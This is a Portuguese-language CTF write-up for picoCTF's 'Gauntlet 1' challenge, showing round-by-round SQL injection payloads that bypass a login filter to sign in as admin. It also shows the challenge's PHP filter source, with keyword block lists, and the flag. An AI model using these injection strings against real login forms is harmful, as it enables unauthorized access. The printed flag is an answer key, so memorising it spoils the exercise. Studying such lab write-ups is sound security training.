# Gauntlet 1 
###### Resolvido por @Menegaldo e @BrunoCuba
> Este é um CTF sobre [SQL Injection]  

## Sobre o Desafio  
Can you beat the filters? 

**Objetivo:** Log in as admin.  

## 🔗 Links do Desafio
- [Gauntlet_1](https://play.picoctf.org/practice/challenge/88)
- [Acesse o desafio](http://jupiter.challenges.picoctf.org:19593/)  
- [Página de filtragem](http://jupiter.challenges.picoctf.org:19593/filter.php)  

Boa sorte! 🔥  


## Solução

Ao acessar o site, somos apresentados a uma tela de login onde precisamos fornecer um nome de usuário e senha. O principal desafio aqui é descobrir como "burlar" a filtragem SQL para conseguir logar como o usuário "admin".

![image](https://github.com/user-attachments/assets/bbfac422-eb64-4cb1-8829-41d31270dd6b)

#### Análise Inicial:

Na página de login, ao tentar submeter credenciais genéricas, observamos que o sistema faz uma consulta SQL com base nas entradas fornecidas. O que nos chamou atenção foi que a consulta estava vulnerável a um SQL Injection. Aqui, começamos a explorar como explorar esse tipo de falha.

![image](https://github.com/user-attachments/assets/75983be8-7be6-46fd-a23d-bb24e4897f6c)

Round 1:
No primeiro round, a consulta SQL aceita o uso de comentários para ignorar a parte da senha. Isso foi feito utilizando o símbolo --, que serve para comentar tudo após ele na consulta.

Entrada:
```
Usuário: admin' --
Senha: qualquercoisa
```
```
SELECT * FROM users WHERE username = 'admin' --' AND password = 'qualquercoisa'
```

Neste caso, a parte da senha foi ignorada devido ao comentário, permitindo o login com o usuário "admin".

![image](https://github.com/user-attachments/assets/cfa0cf35-6072-4005-8687-220fffe93a8e)

Round 2:
No segundo round, foi possível observar que mais palavras-chave estavam permitidas na consulta SQL, como /*, outro tipo de comentário. A ideia era testar se podíamos usar esses novos filtros para burlar a autenticação.

round 2 -
username:
admin' /*          ( # e /* são outras formas de comentar)
password:
qualquercoisa

SELECT * FROM users WHERE username='admin' /*' AND password='1'


round 3 -
username:
admin';              (o ; indica o final de uma execução e começo da outra)
password:
qualquercoisa

SELECT * FROM users WHERE username='admin';' AND password='123'

round 4 -
username:
ad'||'min';          ()
password:
qualquercoisa

SELECT * FROM users WHERE username='ad'||'min';' AND password='123'

round 5 -
username:
ad'||'min';          ()
password:
qualquercoisa

SELECT * FROM users WHERE username='ad'||'min';' AND password='123'

filter.php

icoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}



```
<?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}
?>
```

> Assim, obtemos a flag `picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}`  
